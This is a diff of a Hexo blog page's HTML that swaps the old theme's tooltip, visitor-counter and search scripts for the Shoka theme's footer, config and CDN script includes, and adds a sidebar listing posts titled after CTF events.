-    <a href="#"><i class="fa fa-arrow-up"></i></a>
-    <a href="#comments"><i class="fa fa-comments-o"></i></a>
-    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+<div class="breadcrumb">
 </div>
-<script>
-    $(document).ready(function() {
-        if ($("#comments").length < 1) {
-            $("#scroll > a:nth-child(2)").hide();
-        };
-    })
-</script>
 
-<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
-</script>
+    <span><a href="/2023/08/25/hello-world/" title="article">article</a></span>
+  </li>
 
-  <script language="javascript">
-    $(function() {
-        $("a[title]").each(function() {
-            var a = $(this);
-            var title = a.attr('title');
-            if (title == undefined || title == "") return;
-            a.data('title', title).removeAttr('title').hover(
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
 
-            function() {
-                var offset = a.offset();
-                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
-                    top: offset.top - a.outerHeight() - 15,
-                    left: offset.left + a.outerWidth()/2 + 1
-                }).fadeIn(function() {
-                    var pop = $(this);
-                    setTimeout(function() {
-                        pop.remove();
-                    }, pop.text().length * 800);
-                });
-            }, function() {
-                $("#anchortitlecontainer").remove();
-            });
-        });
-    });
-</script>
+    <span><a href="/2023/08/28/LITCTF%202023%20WEB/" title="Untitled">Untitled</a></span>
+  </li>
 
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
 
-    <script type="text/javascript">
-      window.onload = function(){
-        document.getElementById("search").onclick = function(){
-            console.log("search")
-            search();
-        }
-      }
-      function search(){
-        (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
-        (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
-        e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
-        })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+    <span><a href="/2023/08/28/Tenable%20CTF/" title="Untitled">Untitled</a></span>
+  </li>
 
-        _st('install','A1Pz-LKMXbrzcFg2FWi6','2.0.0');
-      }
-    </script>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
 
+    <span><a href="/2023/08/28/DASCTF%202023%20&%200X401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/" title="Untitled">Untitled</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>Recent Comments</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">John Doe @ Yume Shoka</span>
   </div>
+  <div class="powered-by">
+    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '',
+    favicon: {
+      show: "（●´3｀●）Goooood",
+      hide: "(´Д｀)Booooom"
+    },
+    search : {
+      placeholder: "Search for Posts",
+      empty: "We didn't find any results for the search: ${query}",
+      stats: "${hits} results found in ${time} ms"
+    },
+    valine: true,fancybox: true,
+    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
 </body>
 </html>
